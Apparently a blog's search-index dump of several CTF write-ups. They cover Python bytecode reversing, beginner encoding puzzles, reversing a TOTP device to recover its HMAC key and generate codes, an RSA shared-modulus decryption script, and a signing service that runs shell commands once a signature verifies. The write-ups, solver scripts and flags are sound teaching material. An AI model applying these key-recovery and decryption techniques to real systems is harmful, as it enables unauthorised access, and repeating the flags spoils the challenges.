1: 0 JUMP_FORWARD (to 4) 2 LOAD_GLOBAL (99) \u003e\u003e 4 LOAD_CONST (0) 6 LOAD_CONST (('md5',)) 8 IMPORT_NAME (hashlib) 10 IMPORT_FROM (md5) ","date":"0001-01-01","objectID":"/2021-11-04-hacklu-pycoin/:3:0","tags":["Hack.lu","CTF","2021","Python","Bytecode","Reverse"],"title":"pycoin - Hack.lu 2021","uri":"/2021-11-04-hacklu-pycoin/"},{"categories":null,"content":"Understanding the byte code We read the byte code step by step to understand what the program does. It reads the user input, and stores it in a variable named k. Precisely the following bytecode would correspond to k = str(input('please supply a valid key:')).encode(). 14 POP_TOP 16 LOAD_NAME (str) 18 LOAD_NAME (input) 20 LOAD_CONST ('please supply a valid key:') 22 CALL_FUNCTION 1 24 CALL_FUNCTION 1 26 LOAD_METHOD (encode) 6: 28 CALL_METHOD 0 30 STORE_NAME (k) Check the input length (k) is 16: 32 LOAD_NAME (len) 34 LOAD_NAME (k) 36 CALL_FUNCTION 1 38 LOAD_CONST (16) 40 COMPARE_OP (==) Check that k[0] = 102. This corresponds to character f. 46 LOAD_NAME (k) 48 LOAD_CONST (0) 50 BINARY_SUBSCR 6: 52 LOAD_CONST (102) 54 COMPARE_OP (==) Each time, if the comparison fails, we will fail with invalid key: 7: 42 EXTENDED_ARG (256) 44 JUMP_IF_FALSE_OR_POP (to 462) Check that k[1] = k[0] + 6. 60 LOAD_NAME (k) 62 LOAD_CONST (1) 64 BINARY_SUBSCR 66 LOAD_NAME (k) 68 LOAD_CONST (0) 70 BINARY_SUBSCR 72 LOAD_CONST (6) 6: 74 BINARY_ADD 76 COMPARE_OP (==) As k[0] is f, we get k[1] = l. The format of Hack.Lu flags is flag{....}, so it makes sense. The next bytecode checks that k[2] = k[1] - k[0] + 91. So, k[2]=‘a’. Then, k[3] = 103 = ‘g’. The following bytecode checks that k[4] = k[11] * 3 - 42. 138 LOAD_NAME (k) 140 LOAD_CONST (4) 142 BINARY_SUBSCR 6: 144 LOAD_NAME (k) 146 LOAD_CONST (11) 12: 148 BINARY_SUBSCR 150 LOAD_CONST (3) 152 BINARY_MULTIPLY 154 LOAD_CONST (42) 156 BINARY_SUBTRACT 158 COMPARE_OP (==) As we know that k[4]='{', this means k[11] = (k[4] + 42)/3 = ‘7’ The next check is: k[5] = sum(k)-1322 164 LOAD_NAME (k) 6: 166 LOAD_CONST (5) 168 BINARY_SUBSCR 13: 170 LOAD_NAME (sum) 172 LOAD_NAME (k) 174 CALL_FUNCTION 1 176 LOAD_CONST (1322) 178 BINARY_SUBTRACT 180 COMPARE_OP (==) The next check is k[6] + k[7] + k[10] == 260: 186 LOAD_NAME (k) 188 LOAD_CONST (6) 190 BINARY_SUBSCR 192 LOAD_NAME (k) 194 LOAD_CONST (7) 6: 196 BINARY_SUBSCR 198 BINARY_ADD 14: 200 LOAD_NAME (k) 202 LOAD_CONST (10) 204 BINARY_SUBSCR 206 BINARY_ADD 208 LOAD_CONST (260) 210 COMPARE_OP (==) Then, we have: int(chr(k[7]) * 2) + 1 = k[9]. In this formula, beware: chr(k[7]) * 2 is the Python way to create a string of 2 characters chr(k[7]). 216 LOAD_NAME (int) 218 LOAD_NAME (chr) 220 LOAD_NAME (k) 222 LOAD_CONST (7) 224 BINARY_SUBSCR 226 CALL_FUNCTION 1 228 LOAD_CONST (2) 6: 230 BINARY_MULTIPLY 232 CALL_FUNCTION 1 15: 234 LOAD_CONST (1) 236 BINARY_ADD 238 LOAD_NAME (k) 240 LOAD_CONST (9) 242 BINARY_SUBSCR 244 COMPARE_OP (==) We won’t detail the other checks, but there are: int(chr(k[7]) * 2) + 1 = k[9] k[8] % 17 = 16 k[9] = k[8] * 2 md5(k[10] * b’a').digest()[0] - 1 = k[3] k[11] = 55 k[12] = k[14] / 2 - 2 k[13] = k[10] * k[8] % 32 * 2 - 1 k[14] = (k[12] ^ k[9] ^ k[15]) * 3 - 23 k[15] = 125 = ‘}’ ","date":"0001-01-01","objectID":"/2021-11-04-hacklu-pycoin/:4:0","tags":["Hack.lu","CTF","2021","Python","Bytecode","Reverse"],"title":"pycoin - Hack.lu 2021","uri":"/2021-11-04-hacklu-pycoin/"},{"categories":null,"content":"Solving the conditions and flag First, we solve all conditions which directly provide characters. This gives us flag{....} and k[5]='5' and k[11]='7'. Then, we try to find possible values for k[8], knowing that k[8] % 17 == 16, and that k[9] depends on k[8] is probably an alphanumeric character. We are lucky, there is only one possible value for k[8]: ‘2’. def possible_k8(): ''' computes possible values for k[8] which provide alphanumeric value for k[9] given formulas: k[8] % 17 == 16 and k[9] = k[8] * 2 ''' possible = [] for k8 in range(ord('0'), ord('z')+1): if k8 % 17 == 16: k9 = k8 * 2 if k9 \u003c= ord('z'): possible.append(chr(k8)) else: logger.debug(\"k8={}k9={}not possible\".format(chr(k8), chr(k9))) logger.debug(possible) return possible We immediately deduce k[9] = d from formula k[9] = k[8] * 2, and k[7] = 9 from int(chr(k[7]) * 2) + 1 = k[9]. In the last formula, note that the Python operation chr(k[7])*2 returns 9*2, i.e 99. Same, we try to guess possible values for k[10] knowing that md5(k10 * b'a').digest()[0] - 1 = k[3]. We already have k[3]. Assuming k[10] will be alphanumeric, we brute force each value and keep those that match the md5 formula. There is only 1 result. We get k[10] = ‘e’. From k[10], we automatically compute k[13] and k[6]. Then, there are 2 remaining characters to find: k[12] and k[14] which depend on each other. Assuming k[12] will be alphanumeric, we compute k[14] with (k[12] ^ k[9] ^ k[15]) * 3 - 23 and keep possible values. In the end, there is only one possible solution: flag{5f92de703d} ","date":"0001-01-01","objectID":"/2021-11-04-hacklu-pycoin/:5:0","tags":["Hack.lu","CTF","2021","Python","Bytecode","Reverse"],"title":"pycoin - Hack.lu 2021","uri":"/2021-11-04-hacklu-pycoin/"},{"categories":null,"content":"Full source code #!/usr/bin/env python3 import logging from hashlib import md5 logger = logging.getLogger(__name__) logger.setLevel(logging.DEBUG) handler = logging.StreamHandler() formatter = logging.Formatter('%(asctime)s- %(name)s- %(levelname)s- %(message)s') handler.setFormatter(formatter) handler.setLevel(logging.DEBUG) logger.addHandler(handler) def init(): ''' Sets the known characters for the flag ''' k = list('flag{'+'x'*10+'}') k[11] = chr(55) k[5] = '5' logger.debug('len={}k={}'.format(len(k),''.join(k))) return k def possible_k8(): ''' computes possible values for k[8] which provide alphanumeric value for k[9] given formulas: k[8] % 17 == 16 and k[9] = k[8] * 2 ''' possible = [] for k8 in range(ord('0'), ord('z')+1): if k8 % 17 == 16: k9 = k8 * 2 if k9 \u003c= ord('z'): possible.append(chr(k8)) logger.debug(\"Possible k8={}\".format(possible)) return possible def possible_k10(k3): ''' computes possible values for k[10], knowing correct k[3] ''' possible = [] for k10 in range(ord('0'), ord('z')+1): computed_k3 = md5(k10 * b'a').digest()[0] - 1 if k3 == computed_k3: possible.append(chr(k10)) logger.debug(\"Possible k10={}\".format(possible)) return possible def possible_k12(k9, k15): ''' computes possible values for k[12], knowing correct k[9] and k[15] which give alphanumeric result for k[14] knowing formulas: k[14] = (k[12] ^ k[9] ^ k[15]) * 3 - 23 k[12] = k[14] / 2 - 2 ''' possible = [] for k12 in range(ord('0'), ord('z')+1): k14 = (k12 ^ k9 ^ k15) * 3 - 23 if k14 \u003e= ord('0') and k14 \u003c= ord('z'): if k14 == (k12 + 2) *2: possible.append(chr(k12)) logger.debug(\"Possible k12={}\".format(possible)) return possible if __name__ == '__main__': k = init() possible = possible_k8() assert(len(possible) == 1), \"we have several possible k8\" k[8] = possible[0] logger.debug(\"k[8]={}\".format(k[8])) # k[9] = k[8] * 2 k[9] = chr(ord(k[8]) * 2) logger.debug(\"k[9]={}\".format(k[9])) # int(chr(k[7]) * 2) + 1 = k[9] k[7] = str(ord(k[9])-1)[0] logger.debug(\"k[7]={}\".format(k[7])) possible = possible_k10(ord(k[3])) assert(len(possible) == 1), \"we have several possible k10\" k[10] = possible[0] k[13] = chr( (((ord(k[10]) * ord(k[8])) % 32) * 2) - 1) logger.debug(\"k[13]={}\".format(k[13])) #k[6] + k[7] + k[10] = 260 k[6] = chr(260 - ord(k[7]) - ord(k[10])) logger.debug(\"k[6]={}\".format(k[6])) possible = possible_k12(ord(k[9]), ord(k[15])) assert(len(possible) == 1), \"we have several possible k12\" k[12] = possible[0] k[14] = chr((ord(k[12]) + 2) * 2) logger.debug(\"k[14]={}\".format(k[14])) logger.info(\"Solution: {}\".format(''.join(k))) ","date":"0001-01-01","objectID":"/2021-11-04-hacklu-pycoin/:6:0","tags":["Hack.lu","CTF","2021","Python","Bytecode","Reverse"],"title":"pycoin - Hack.lu 2021","uri":"/2021-11-04-hacklu-pycoin/"},{"categories":null,"content":"The overall intent for Shakti CTF is for beginners, learn what is a CTF and get women interested in the topic. Therefore, the “easy” 50 points challenges are really very very easy, and 100-point challenges are still *really easy (far easier than baby challenges at Hack.Lu CTF ;-). Everybody has to start one day ;P so I’m okay with this rating as long as it remains consistent. Globally, this was the case, with the exception of a few challenges under/over rated. Challenges My opinion on the rating Easy Encoding Slightly more difficult than other [ultra] baby challenges PYthn Appropriate rating Biscuits Very easy but consistent rating AuthEN Very easy but consistent rating Ancient Warfare Very easy but consistent rating Not that easy Overrated Connect Very easy but consistent rating Damez Overrated! Come on! Shark on Wire Very easy but consistent rating 3, 2, 1… Go Very easy but consistent rating Easy Encoding (Crypto, 50 points) Joan knows this is breakable. Do you know how? 01001110 01111010 01001101 00110010 01001111 01000100 01011001 01111000 01001110 01101101 01001001 00110011 01001110 01000100 01011001 00110101 01001110 01101010 01001101 00110011 01001110 01000100 01011001 00110010 01001110 00110010 01001001 00110001 01001110 01111010 01001101 00110000 01001110 01111010 01001001 00110010 01011010 01000100 01010101 00110001 01001110 01111010 01000001 00110001 01011010 01101010 01010001 01111010 01001110 01101010 01100111 01111010 01001110 01000100 01011010 01101010 01001110 01101101 01001101 01111010 01001101 01111010 01011010 01101100 01001110 01101010 01100011 01111010 01001101 01111010 01100100 01101011 We transform each 8-bit sequence in a character: result = [] encoding = '01001110 01111010 01001101 00110010 01001111 01000100 01011001 01111000 01001110 01101101 01001001 00110011 01001110 0100010 0 01011001 00110101 01001110 01101010 01001101 00110011 01001110 01000100 01011001 00110010 01001110 00110010 01001001 00110001 01001110 01111010 01001101 00110000 01001110 01111010 01001001 00110010 01011010 01000100 01010101 00110001 01001110 01111010 01000001 00110001 01011010 01101010 01010001 01111010 01001110 01101010 01100111 01111010 01001110 01000100 01011010 01101010 01001110 01101101 01001101 0 1111010 01001101 01111010 01011010 01101100 01001110 01101010 01100011 01111010 01001101 01111010 01100100 01101011' for c in encoding.split(' '): result.append(chr(int(c,2))) print(\"Encoded string: {0}\".format(''.join(result))) The result is NzM2ODYxNmI3NDY5NjM3NDY2N2I1NzM0NzI2ZDU1NzA1ZjQzNjgzNDZjNmMzMzZlNjczMzdk. This is not yet the flag, but it is good because only ASCII characters, we are probably close to the solution. Encoding. Lets' try Base 64 decoding. import base64 unb64 = base64.b64decode(''.join(result)) print(\"Flag: {0}\".format(bytes.fromhex(unb64.decode('utf-8')))) We get the flag shaktictf{W4rmUp_Ch4ll3ng3}. PYthn (Reversing, 100 points) Challenge description only says: Familiar with python? and provides a Python source file. The source file has 3 functions: Fun, FuN and fuN. I immediately rename those to make the reading easier. Also, actually, fuN is never called. We only have k=FuN(Fun(X)), so I rename Fun as step1 and FuN will be step2. The idea of the program is to take some input, feed it in a custom algorithm (step1 then step2) and compare the value to an expected hash. If the digests are equal, then the input is the flag (need to surround with shaktictf{...}). Let’s try to inverse the algorithm. step1 does an XOR which will work both ways. Nothing to do. step2 does +i+5 and +4. Let’s try the inverse: -i-5 and -4. Z=[] k=[] thehash=\"K78m)hm=|cwsXhbH}uq5w4sJbPrw6\" def unstep2(inp): for i in range(len(inp)): if(i\u003c11): Z.append(chr(ord(inp[i])-i-5)) else: Z.append(chr(ord(inp[i])-4)) print(\"[unstep2] returns: \", ''.join(Z)) return(''.join(Z)) def step1(inp): st=[] for i in range (len(inp)): st.append(chr(ord(inp[i])^1)) print(\"[step1] returns: \", ''.join(st)) return(''.join(st)) a=unstep2(step1(thehash)) prin","date":"0001-01-01","objectID":"/2020-12-07-shakticon/:0:0","tags":["Shakticon","CTF","2020"],"title":"Shakti CTF 2020","uri":"/2020-12-07-shakticon/"},{"categories":null,"content":"Description “I sealed my master phassphrase on this device and protected it using my own TOTP algorithm. Can you recover it ? Once ready, come to the organizers desk to validate your solution on the device. (No connection to the device allowed)” Solution I didn’t solve this challenge on my own, but with nice team work with another team mate :) ","date":"0001-01-01","objectID":"/2023-03-25-spacial/:0:0","tags":["Insomnihack","CTF","2023","M5 Core","Reverse","Xtensa"],"title":"Spacial TOTP (Insomni'hack CTF 2013)","uri":"/2023-03-25-spacial/"},{"categories":null,"content":"Overview of the device The device is a M5 Core (we used M5 Core Ink at Ph0wn CTF). By turning it to the left/right/up/down, you can enter numbers 0 to 3. The OTP code is a 6-digit code of numbers between 0 and 3. If you enter the correct code, you get the flag. If not, access is denied. In theory, this is not a very secure password, but as we can’t script attempts, it’s still too long to bruteforce all 6-digit possibilities. We could imagine connecting to the serial interface of the device and reading information, or dumping the entire firmware to retrieve the flag, but we are not allowed to connect to the device. The solution needs to come from reversing the challenge.elf file which is provided in the description. ","date":"0001-01-01","objectID":"/2023-03-25-spacial/:1:0","tags":["Insomnihack","CTF","2023","M5 Core","Reverse","Xtensa"],"title":"Spacial TOTP (Insomni'hack CTF 2013)","uri":"/2023-03-25-spacial/"},{"categories":null,"content":"Reversing the Xtensa binary The ELF file is an Xtensa binary. This is not supported by many decompilers, fortunately my team mate has already setup Ghidra with Xtensa support, so we don’t have to lose time setting it up. $ file challenge.elf challenge.elf: ELF 32-bit LSB executable, Tensilica Xtensa, version 1 (SYSV), statically linked, with debug_info, not stripped In Arduino-like devices, the interesting main entry points are always named setup() and loop(). The setup() initializes the M5 Core, its screen and RTC. The most interesting part lies in loop(). Get the current timestamp and create a new OTP code based on the timestamp: iVar4 = 0; memw(); memw(); memw(); timestamp = (time_t)getTimestamp(unaff_a10); memw(); s = TOTP::getCode(\u0026totp,timestamp); new_code = atol(s); timestamp = timestamp + 3600; this = \u0026M5; Tranform the 6-digit OTP code in a 6-digit code using only numbers between 0 and 3: memset(input_sequence,0,6); setScreenMain(); lVar1 = new_code; code = new_code; memw(); i = 0; while (memw(), i \u003c 6) { memw(); memw(); code_sequence[i] = (byte)(lVar1 \u003e\u003e ((i \u0026 0xf) \u003c\u003c 1)) \u0026 3; memw(); memw(); i = i + 1; memw(); memw(); } Compare the input sequence with the expected one. Display the ACCESS GRANTED image and the flag (from the EEPROM) if the code is correct: if (entry == 6) { memw(); iVar4 = memcmp(input_sequence,code_sequence,6); if (iVar4 == 0) { memw(); M5Display::drawJpg(\u0026this-\u003eLcd,access_granted,0x750c,0,0,0,0,0,0,JPEG_DIV_NONE); TFT_eSPI::setCursor((TFT_eSPI *)this,0,200); do { bVar7 = EEPROMClass::read(\u0026EEPROM,iVar4); iVar4 = iVar4 + 1; Print::printf((Print *)this,\u0026DAT_3f41b32c,(uint)bVar7,0,0,0); } while (iVar4 != 0x1c); Once again, if we had been authorized to physically connect to the device, we would have been able to retrieve the flag from the EEPROM. But we’re not allowed to, so the solution is Implement the OTP algorithm Implement the digit transformation Compile Go to the device, make sure our time is synchronized Run our program and get the correct code Enter it on the device to get the flag. ","date":"0001-01-01","objectID":"/2023-03-25-spacial/:2:0","tags":["Insomnihack","CTF","2023","M5 Core","Reverse","Xtensa"],"title":"Spacial TOTP (Insomni'hack CTF 2013)","uri":"/2023-03-25-spacial/"},{"categories":null,"content":"OTP implementation We dig into TOTP::getCode: char * __thiscall TOTP::getCode(TOTP *this,long timeStamp) { char *pcVar1; pcVar1 = getCodeFromSteps(this,timeStamp / this-\u003e_timeStep); return pcVar1; } The functions calls getCodeFromSteps with 2 parameters: the TOTP object, and a number of iterations. If we decompile getCodeFromSteps, we see it computes a HMAC-SHA1 over the number of iterations, using a HMAC key. this-\u003e_byteArray[4] = (uint8_t)((uint)steps \u003e\u003e 0x18); iVar4 = 0; this-\u003e_byteArray[5] = (uint8_t)((uint)steps \u003e\u003e 0x10); *(ushort *)(this-\u003e_byteArray + 6) = (ushort)(steps \u003c\u003c 8) | (ushort)((uint)steps \u003e\u003e 8) \u0026 0xff; memw(); *(undefined4 *)this-\u003e_byteArray = 0; memw(); Sha1Class::initHmac(\u0026Sha1,this-\u003e_hmacKey,this-\u003e_keyLength); Print::write(\u0026Sha1.super_Print,this-\u003e_byteArray,8); puVar6 = Sha1Class::resultHmac(\u0026Sha1); Then, there is some logic to truncate the output, but we don’t need to look into it now (and actually, we’ll see we don’t need to look into it at all). this-\u003e_truncatedHash = 0; iVar2 = 3; while( true ) { uVar3 = this-\u003e_truncatedHash \u003c\u003c 8; iVar5 = (lastHmacByte \u0026 0xf) + iVar4; this-\u003e_truncatedHash = uVar3; iVar4 = iVar4 + 1; ","date":"0001-01-01","objectID":"/2023-03-25-spacial/:3:0","tags":["Insomnihack","CTF","2023","M5 Core","Reverse","Xtensa"],"title":"Spacial TOTP (Insomni'hack CTF 2013)","uri":"/2023-03-25-spacial/"},{"categories":null,"content":"Finding OTP configuration settings So, it seems important to know What HMAC key is The number of steps which are used Both information are part of the TOTP object: we see this-\u003e_hmacKey in HMAC initialization, and this-\u003e_timeStep in getCode(). In Ghidra’s Data Type manager, we search for the TOTP type. It opens a structure editor where we see the fields of the object, including _hMacKey and _timeStep. A right click on those lists the uses of the fields. We locate the instantiation of the TOTP object: void _GLOBAL__sub_I_prev_state(void) { TOTP::TOTP(\u0026totp,hmacKey,10,0x3c); return; } This sets the HMAC key in the TOTP object. It’s a 10 byte key. And 0x3c is the number of iterations. void __thiscall TOTP::TOTP(TOTP *this,uint8_t *hmacKey,int keyLength,int timeStep) { this-\u003e_hmacKey = hmacKey; this-\u003e_keyLength = keyLength; this-\u003e_timeStep = timeStep; memw(); return; } To find the value of hmacKey, we click on it and go to the bytes view. So, we now have all configuration settings for TOTP: the HMAC key (10 bytes) and the number of steps (0x3c). ","date":"0001-01-01","objectID":"/2023-03-25-spacial/:4:0","tags":["Insomnihack","CTF","2023","M5 Core","Reverse","Xtensa"],"title":"Spacial TOTP (Insomni'hack CTF 2013)","uri":"/2023-03-25-spacial/"},{"categories":null,"content":"How not to reinvent the wheel We were about to reimplement the TOTP algorithm ourselves when we realized it was probably taken from the net. We searched for getCodeFromSteps and HMAC and quickly found a C library on GitHub. We cloned the library and confirmed it was exactly the code we had. So, no need to reimplement TOTP, we can just use it. Based on the README, we created our TOTP solving program: #include \"TOTP.h\"#include \u003cstdio.h\u003e#include \u003cstdint.h\u003e#include \u003cstdlib.h\u003e#include \u003ctime.h\u003e void main(int argc, char **argv) { uint8_t hmacKey[] = {0xee, 0xd2, 0x97, 0x6a, 0x1d, 0xcb, 0x29, 0xe0, 0x2e, 0x42}; time_t current_time; TOTP(hmacKey, 10, 0x3c); time(\u0026current_time); printf(\"Time=%ld\\n\", current_time); printf(\"UTC Time=%ld\\n\", current_time-3600); uint32_t newCode = getCodeFromTimestamp(current_time-3600); printf(\"New code: %d\\n\", newCode); uint32_t newCode2 = getCodeFromTimestamp(current_time); printf(\"New code UTC: %d\\n\", newCode2); Then, we added the conversion to 0-3 digits only: int i; char pin[7]; for(i=0;i\u003c6;i++) { pin[i] = newCode \u003e\u003e (i*2) \u0026 3; pin[i]+='0'; } printf(\"\\npin : %s\\n\",pin); for(i=0;i\u003c6;i++) { pin[i] = newCode2 \u003e\u003e (i*2) \u0026 3; pin[i]+='0'; } printf(\"\\npin UTC: %s\\n\",pin); } Our program finally compiled (see Troubleshooting section for more crunchy details). We went to the device, checked time synchronization between our laptop and the device (perfect - at most a few seconds difference), waited for the code to change, and then entered it and bingo! Troubleshooting Should talk about how much time we stupidly wasted trying to compile and link this silly program? Be kind with us, it was late, and we actually had to fix the library which was not taking care of multiple re-definitions. We added of couple of: #ifdef SHA1_IMPLEMENTATION uint8_t bufferOffset; uint32_t byteCount; uint8_t keyBuffer[BLOCK_LENGTH]; uint8_t innerHash[HASH_LENGTH]; ... #else extern uint8_t bufferOffset; extern uint32_t byteCount; extern uint8_t keyBuffer[BLOCK_LENGTH]; extern uint8_t innerHash[HASH_LENGTH]; #endif The other we ran into was the difference between our current local time and UTC time. In the device’s code, you probably noticed timestamp = timestamp + 3600;. We saw it too, and deduced that the TOTP code was based on UTC time. As we’re 1 hour ahead, we deduced we had to remove 3600 seconds from our timestamps in our own computation of the TOTP code. Unfortunately, the resulting code did not work. We checked our code, we checked the reverse and could not see any mistake, so we decided to also compute a code without removing 3600 seconds - because you know, it’s midnight and everybody is tired so maybe we just got it wrong. We did so, and we flagged. But without understanding why it worked without those 3600 seconds difference… Other write-up https://blog.nanax.fr/post/2023-03-25-spacial-totp/ ","date":"0001-01-01","objectID":"/2023-03-25-spacial/:5:0","tags":["Insomnihack","CTF","2023","M5 Core","Reverse","Xtensa"],"title":"Spacial TOTP (Insomni'hack CTF 2013)","uri":"/2023-03-25-spacial/"},{"categories":null,"content":"RSA Internal Attacker - THCon 2021 ","date":"0001-01-01","objectID":"/2021-06-14-thcon-others/:0:0","tags":["THCon","CTF","2021","Crypto"],"title":"THCon CTF 2021 - Crypto challenges","uri":"/2021-06-14-thcon-others/"},{"categories":null,"content":"Challenge description I've found this rsa implementation, it is quite strange. I have a public/private key and I've also intercepted a ciphertext but infortunately it was not for me, so I can't read it. But I'am really curious, can you decrypt it ? :) 2 files are provided: #!/usr/bin/env python3 from Crypto.Util.number import getPrime, inverse, bytes_to_long import random from math import gcd def init(): p = getPrime(1024) q = getPrime(1024) return p, q def new_user(p, q): phi = (p - 1) * (q - 1) while True: e = random.randint(2, 100000) if gcd(e, phi) == 1: break d = inverse(e, phi) return e, d def encrypt(m, e, n): return pow(m, e, n) p, q = init() n = p * q e_a, d_a = new_user(p, q) e_b, d_b = new_user(p, q) FLAG = b\"THC2021{??????????????????????????????????????}\" c = encrypt(bytes_to_long(FLAG), e_b, n) print(f\"The public modulus : {hex(n)}\") print(f\"Your key pair : ({hex(e_a)}, {hex(d_a)})\") print(f\"Your boss public key : {hex(e_b)}\") print(f\"Intercepted message : {hex(c)}\") output.txt: The public modulus : 0x8d926c44899930f8f3fc3ea04cb9dfa7eb309b6d8e932b531007c4d8479e1dd227365087feeced8f854b1b54cc947182ee2241fe526c758e630b44e0c196ce8dc0995124f94755b0601d3454f89f178db2ffb3adeafcac2f49b656aace2acdb63afcd62a8847aadc55ca2452dff8c65ea5bfcfe03411f3b63a2bc4b244126259e2e845c68f8c1cd2d275bd2e344d35da542503c72f153ded14f766efecdfc98605e6963c4b1a7197de9e56b4b61ca1ab648265e6775819935a005a089eff04c27083d385e8d73ebf56b47f875c5fa9984e026914e1cbfc02205e75d02dc0da392700b536bf0fc8decd043736441e69fecc696b2127589f2ac9700e30c4dc88ef Your key pair : (0x8095, 0x21a31ccbce8117f468e9c26e3a404659d585ea166606c85ff192466b8dd4d9650b110addef35e3effdf8cb8710235cf5843e688e977be0d32842e0b4fa493f451ad8d77d35672696cf4373eaa0c0093a6a0baa348f790fc466be559bd90e788505b795026df6e991f6e8769565e06f472a445676e2c99240eccab25cd44433e8a083e66912c7a81c81c190470188c699c1a24dac441956b46aa364623f2c78c4ffca49e89f8a6f6edc51140e744f80a968fa80901fc91b88d491829b334542fd3ef460ddfa9a729d981b0ae9fa12bd0901c919972020b5f9e661b34a914fff85732e45718a2d216018507e7406aed4543096df76ca6fcfa4ab5dd21a84f162fd) Your boss public key : 0x22bb Intercepted message : 0x2118ee5b546b529c6b8d8fba1638f046006d7de2c10571d179af958f65d223a9a78df91daa5913f39f97d47681e1e10b8c58b6b462caf1fd56c683129ea732927cf55a06441cde5b743d00582569c9bbf43dab3d7b46ddbf03b358ca6ee075bafcc06165efa8592474bf78732dec4433502579338f2b925a922e74704cf19f7dff414a451fbc24b4ace4a9d8a072fb4259ebc8452941eb9f100f1df0cf19d5718088867a17d52d1c3f1fd5f92c9b9c55cbe528fbfd130879c14bde651a9e402f50b851c753e5915882b02a1136b43e015c6d4fd07e48aa05be08e9faf533a763f21d29a9b7fe8f355a8ffcbf11dc96b1069df4e302a3b310ecf39f25300bb375 ","date":"0001-01-01","objectID":"/2021-06-14-thcon-others/:1:0","tags":["THCon","CTF","2021","Crypto"],"title":"THCon CTF 2021 - Crypto challenges","uri":"/2021-06-14-thcon-others/"},{"categories":null,"content":"Solving the challenge Reading chall.py, we see the program creates 2 RSA key pairs, for “me” and my boss, using the same modulus (n). By definition, RSA key pairs are created such as e*d = 1 mod phi: e is the public exponent d the corresponding private exponent phi is (p-1)(q-1) - actually we don’t care so much to solve the exercise, although it’s important for RSA! And p and q are 2 primes such that n = p*q (same we don’t care). So, e*d is a multiple of phi + 1. This means we have an integer k, such that e*d = k *phi + 1. For our boss, we have only the public exponent (e_b). But if we have managed to compute phi, then compute the private exponent of our boss (d_b) is simple. Again, e *d = 1 mod phi, so d = 1/e mod phi, i.e d is the modular inverse of e (modulus phi). And once we know the private exponent, then it is game over to decrypt the intercepted message, we just use the standard RSA formula: plaintext = ciphertext ^ d mod n. So, the challenge boils down on finding phi. Actually, we can easily compute k * phi, but we have no idea what value k (an integer) has. So, we’ll just try and check the decrypted ciphertext looks like a flag. All flags at THCon begin with THCon21{, so we’ll check this. (IMHO, chall.py is misleading here as it mentions THC2021{. This should have been changed). In the end, we are very lucky, the solution arrives nearly immediately. I would have let the program run 5 minutes at most, before trying a more intelligent approach (common modulus attack etc). #!/usr/bin/env python3 from Crypto.Util.number import inverse, long_to_bytes # ---------------------- n = int(0x8d926c44899930f8f3fc3ea04cb9dfa7eb309b6d8e932b531007c4d8479e1dd227365087feeced8f854b1b54cc947182ee2241fe526c758e630b44e0c196ce8dc0995124f94755b0601d3454f89f178db2ffb3adeafcac2f49b656aace2acdb63afcd62a8847aadc55ca2452dff8c65ea5bfcfe03411f3b63a2bc4b244126259e2e845c68f8c1cd2d275bd2e344d35da542503c72f153ded14f766efecdfc98605e6963c4b1a7197de9e56b4b61ca1ab648265e6775819935a005a089eff04c27083d385e8d73ebf56b47f875c5fa9984e026914e1cbfc02205e75d02dc0da392700b536bf0fc8decd043736441e69fecc696b2127589f2ac9700e30c4dc88ef) e_a = int(0x8095) d_a = int(0x21a31ccbce8117f468e9c26e3a404659d585ea166606c85ff192466b8dd4d9650b110addef35e3effdf8cb8710235cf5843e688e977be0d32842e0b4fa493f451ad8d77d35672696cf4373eaa0c0093a6a0baa348f790fc466be559bd90e788505b795026df6e991f6e8769565e06f472a445676e2c99240eccab25cd44433e8a083e66912c7a81c81c190470188c699c1a24dac441956b46aa364623f2c78c4ffca49e89f8a6f6edc51140e744f80a968fa80901fc91b88d491829b334542fd3ef460ddfa9a729d981b0ae9fa12bd0901c919972020b5f9e661b34a914fff85732e45718a2d216018507e7406aed4543096df76ca6fcfa4ab5dd21a84f162fd) e_b = int(0x22bb) ciphertext = int(0x2118ee5b546b529c6b8d8fba1638f046006d7de2c10571d179af958f65d223a9a78df91daa5913f39f97d47681e1e10b8c58b6b462caf1fd56c683129ea732927cf55a06441cde5b743d00582569c9bbf43dab3d7b46ddbf03b358ca6ee075bafcc06165efa8592474bf78732dec4433502579338f2b925a922e74704cf19f7dff414a451fbc24b4ace4a9d8a072fb4259ebc8452941eb9f100f1df0cf19d5718088867a17d52d1c3f1fd5f92c9b9c55cbe528fbfd130879c14bde651a9e402f50b851c753e5915882b02a1136b43e015c6d4fd07e48aa05be08e9faf533a763f21d29a9b7fe8f355a8ffcbf11dc96b1069df4e302a3b310ecf39f25300bb375) print(\"n={}\".format(n)) print(\"e_a={}\".format(e_a)) print(\"d_a={}\".format(d_a)) print(\"e_b={}\".format(e_b)) # ---------------------- # e * d = 1 mod phi # so, e * d = k * phi + 1 found = False k = 1 kphi = (e_a * d_a) - 1 while not found: # compute possible phi phi = ((e_a * d_a) - 1) // k # d = 1/e mod phi d_b = inverse(e_b, phi) plaintext = pow(ciphertext,d_b, n) flag = long_to_bytes(plaintext) if flag.startswith(b'THCon21'): found = True print(flag) print(\"k={}\".format(k)) quit() k = k + 1 The flag is THCon21{coMm0n_m0duLus_wh1th_int3rn4l_aTt4ck3r}. NB. I didn’t flag this during the CTF, as I only played sporadically. A pity! ;-) Baby sign ","date":"0001-01-01","objectID":"/2021-06-14-thcon-others/:2:0","tags":["THCon","CTF","2021","Crypto"],"title":"THCon CTF 2021 - Crypto challenges","uri":"/2021-06-14-thcon-others/"},{"categories":null,"content":"The challenge Nowadays even toddlers use rsa to sign: nc server 11001 (where server was up during the CTF). And providing server.py, which is the program which runs on the server. from Crypto.Util.number import getPrime, GCD, inverse, bytes_to_long import os class SecureSigner(): def __init__(self): p = getPrime(512) q = getPrime(512) e = 0x10001 phi = (p-1)*(q-1) while GCD(e,phi) != 1: p = getPrime(512) q = getPrime(512) phi = (p-1)*(q-1) self.d = inverse(e,phi) self.n = p * q self.e = e def sign(self, message): return pow(message,self.d,self.n) def verify(self, message, signature): return pow(signature,self.e,self.n) == message def menu(): print( \"\"\" 1 - Sign an 8-bit integer 2 - Execute command 3 - Exit \"\"\" ) choice = input(\"Choice: \") if choice == \"1\": try: m = int(input(\"Integer to sign: \")) if 0 \u003c= m \u003c 256: print(\"Signature: {:d}\".format(s.sign(m))) else: print(\"You can only sign 8-bit integers.\") except: print(\"An error occured.\") exit(1) elif choice == \"2\": try: cmd = input(\"Command: \") m = bytes_to_long(cmd.encode()) signature = int(input(\"Signature: \")) if s.verify(m,signature): os.system(cmd) else: print(\"Wrong signature.\") except: print(\"An error occured.\") exit(1) elif choice == \"3\": exit(0) else: print(\"Incorrect input.\") exit(1) 